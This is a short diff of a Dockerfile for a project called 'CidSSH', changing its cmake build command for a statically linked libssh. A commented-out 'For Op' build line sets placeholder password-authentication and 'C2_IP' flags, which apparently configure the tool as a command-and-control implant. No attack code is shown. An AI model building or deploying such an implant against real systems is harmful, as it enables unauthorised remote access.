@@ -11,6 +11,6 @@ WORKDIR /Cid-SSH/
 
 # Building CidSSH
 RUN rm -rf build && mkdir build
-RUN cd build && cmake -DLIBSSH_LIBRARY=/usr/local/lib/libssh.a -DLIBSSH_INCLUDE=/tmp/libssh-0.8.7/include/ -DLIBSSH_CONFIG_FOLDER=/tmp/libssh-0.8.7/build/ -DCMAKE_BUILD_TYPE=Release .. && make 
+RUN cd build && cmake -DCMAKE_BUILD_TYPE=Release .. && make VERBOSE=1
 # For Op
 #RUN mkdir build && cd build && cmake -DLIBSSH_LIBRARY=/usr/local/lib/libssh.a -DLIBSSH_INCLUDE=/tmp/libssh-0.8.7/include/ -DLIBSSH_CONFIG_FOLDER=/tmp/libssh-0.8.7/build/ -DCMAKE_BUILD_TYPE=Release -DPASSWORD_AUTH="xxxxxxxxxx" -DC2_IP="XX.XX.XX.XX" .. && make 
